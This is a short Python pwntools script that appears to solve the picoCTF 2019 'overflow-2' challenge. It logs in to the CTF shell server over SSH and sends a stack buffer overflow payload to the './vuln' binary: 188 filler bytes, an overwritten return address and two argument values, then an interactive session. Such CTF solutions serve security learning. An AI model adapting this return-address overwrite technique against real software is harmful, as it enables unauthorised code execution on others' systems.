from pwn import *

conn = ssh(host="2019shell1.picoctf.com", user=USER, password=PASS)
conn.set_working_directory(b"/problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e")

payload = b"A" * 188
payload += p32(0x080485e6)
payload += p32(0x00000000)
payload += p32(0xdeadbeef)
payload += p32(0xc0ded00d)

p = conn.process('./vuln')
p.send(payload)
p.interactive()



